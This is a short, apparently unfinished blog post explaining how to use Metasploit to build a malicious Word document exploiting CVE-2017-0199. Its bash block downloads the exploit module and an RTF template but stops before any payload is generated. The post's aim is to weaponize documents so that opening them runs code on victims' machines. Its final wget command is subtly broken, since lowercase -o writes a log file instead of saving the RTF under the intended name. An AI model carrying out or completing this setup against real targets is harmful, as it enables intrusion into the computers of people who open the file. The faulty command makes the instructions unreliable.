---
layout: post
title:  "Malicious Payloads in Word Documents"
date:   2017-04-29
tags:
- Networking
- Hacking
- Security
- Ubuntu
- Linux
---
Metasploit Framework


Last month a vulnerability was detected in MS Word that allowed running arbitrary code upon opening word documents. [versions](https://www.cvedetails.com/cve/CVE-2017-0199/). Microsoft patched the vulnerability very quickly. In this post I am going to explain how to use Metasploit Framework to generate a Word document

```bash
# Variables
EXTERNAL_EXPLOIT_MODULES=$HOME/.msf4/modules/exploits
EXPLOIT_TEMPLATES_DIR=/usr/share/metasploit-framework/data/exploits/

# Create the directory to add external modules and add the PoC exploit to the directory
mkdir -p $EXTERNAL_EXPLOIT_MODULES
cd $EXTERNAL_EXPLOIT_MODULES
wget "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/fileformat/office_word_hta.rb"

# Download a template RTF file to be used for embedding payload (You can use any RTF file)
cd $EXPLOIT_TEMPLATES_DIR
wget "http://thewalter.net/stef/software/rtfx/sample.rtf" -o "cve-2017-0199.rtf"
```



### Sources
[https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)

[https://www.cvedetails.com/cve/CVE-2017-0199/](https://www.cvedetails.com/cve/CVE-2017-0199/)
